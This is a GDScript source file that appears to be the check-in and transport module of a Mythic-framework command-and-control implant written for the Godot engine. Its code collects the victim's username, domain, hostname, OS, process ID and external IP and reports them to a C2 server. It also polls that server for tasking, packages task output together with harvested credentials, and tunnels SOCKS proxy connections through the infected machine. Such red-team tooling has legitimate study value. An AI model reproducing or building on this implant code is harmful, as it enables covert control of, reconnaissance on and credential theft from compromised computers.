extends Node

var protocol = null

const TransportSocks = preload("res://transport/socks.gd")

signal post_response
signal tasking

var config = null
var _sent_checkin_already = false
var socks_connection = {}

# Called when the node enters the scene tree for the first time.
func _ready():
	config = $".".get_parent().get_node("config")
	protocol = config.get_transport($".", $".".get_parent().get_parent().get_node("Agent"))

func _send_checkin():
	if _sent_checkin_already:
		print("friggin chill for dat uuid brah...")
		return
	
	if protocol != null:
		var username
		if OS.has_environment("USERNAME"):
			username = OS.get_environment("USERNAME")
		else:
			username = "UnknownUserName"

		var userdomain
		if OS.has_environment("USERDOMAIN"):
			userdomain = OS.get_environment("USERDOMAIN")
		else:
			userdomain = ""

		var hostname = OS.get_unique_id()
		if OS.has_environment("COMPUTERNAME"):
			hostname = OS.get_environment("COMPUTERNAME")
		if OS.has_environment("HOSTNAME"):
			hostname = OS.get_environment("HOSTNAME")

		var os = "%s (%s) - %s [%s] - %s" % [OS.get_name(), OS.get_model_name(), OS.get_version(), OS.get_distribution_name(), DisplayServer.get_name()]
		if OS.has_environment("OS"):
			os = OS.get_environment("OS")
		else:
			if OS.has_feature("Windows"):
				os = "Windows"
			elif OS.has_feature("X11"):
				os = "Linux"
			elif OS.has_feature("OSX"):
				os = "Mac"

		var architecture = "Unknown"
		if OS.has_feature("32"):
			architecture = "32"
		if OS.has_feature("64"):
			architecture = "64"
		if OS.has_feature("x86"):
			architecture = "x86"
		if OS.has_feature("x86_64"):
			architecture = "x86_64"

		var ip: String = "127.0.0.1"# TODO...?
		var upnp = UPNP.new()
		var err = upnp.discover(1000, 4)
		
		if err != OK:
			print(str(err))
		else:
			ip = upnp.query_external_address()

		_sent_checkin_already = protocol.send(JSON.stringify({
			"action": "checkin", # requiredupnp.queryexternaladdress(), #",".join(IP.get_local_addresses()), # internal ip address - required
			"ip": ip,
			"os": os, # os version - required
			"process_name":  OS.get_unique_id(),
			"user": username, # username of current user - required
			"host": hostname, # hostname of the computer - required
			"pid": OS.get_process_id(), # pid of the current process - required
			"uuid": config.get_uuid(), #uuid of the payload - required
			"architecture": architecture, # platform arch - optional
			"domain": userdomain, # domain of the host - optional
			"integrity_level": 3, # integrity level of the process - optional
			#"external_ip": "8.8.8.8", # external ip if known - optional
			"encryption_key": "", # encryption key - optional
			"decryption_key": "", # decryption key - optional
		}), true)
	else:
		print("no transport protocol set - bailing on checkin...")

func _on_callback_timer_timeout():
	if protocol == null:
		return

	if protocol.client_is_connected() == 1:

		if config.is_checkin_complete():
			protocol.client_poll()
		else:
			_send_checkin()
			protocol.recv()
	else:
		protocol.client_connect()

	# leave here - in the event that a request to change it came in...
	$CallbackTimer.wait_time = config.get_callback_wait_time()

func send(payload):
	protocol.send(payload)

func recv(action, result):
	match action:
		"checkin":
			checkin(result)
		"execute":
			execute(result)
		"post_response":
			emit_signal("post_response", result)
		"get_tasking":
			emit_signal("tasking", result)
		_:
			print("unknown... %s ==> " % [action, result])
			unknown_response(result)

func checkin(data):
	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin
	# {action:checkin, decryption_key:, encryption_key:, id:4da40eb1-a0ad-4cec-a443-d7083edd2918, status:success}

	if data.has("payload") and data.get("payload").has("id"):
		config.parse_checkin(data)
		print("checking complete!")
	else:
		print("Checkin failed? ", data)

func execute(result):
	pass

func unknown_response(result):
	pass

# TODO: nuke?
func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], unkeyed_payloads = []):
	var payload = {
		"action": "post_response",
		"responses": [],
	}

	var task_response = {
		"task_id": task_id,
		"user_output": output,
		"status": "error",
		"completed": completed,
	}

	if artifacts.size() > 0:
		task_response["artifacts"] = []

		for artifact in artifacts:
			var entry = {}

			entry["base_artifact"] = artifact[0]
			entry["artifact"] = artifact[1]
			task_response["artifacts"].append(entry)

	if credentials.size() > 0:
		task_response["credentials"] = credentials

	for response in unkeyed_payloads:
		payload["responses"].append(response)

	if unkeyed_payloads.size() <= 0:

		if status:
			task_response["status"] = "success"

		payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?

	return JSON.stringify(payload)

func handle_socks(parameters):
	var do_exit = parameters.get("exit")
	var data = parameters.get("data")
	var server_id = parameters.get("server_id")

	if socks_connection.has(server_id):
		socks_connection[server_id].send(data)

		# send data
		if do_exit:
			socks_connection[server_id].client_disconnect()
			socks_connection[server_id].free()

			socks_connection.erase(server_id)
	else:
		# new connection
		if data != null and not do_exit:
			socks_connection[server_id] = TransportSocks.new(self, server_id, data)
			add_child(socks_connection[server_id]) # s.t. the _process is called every frame?
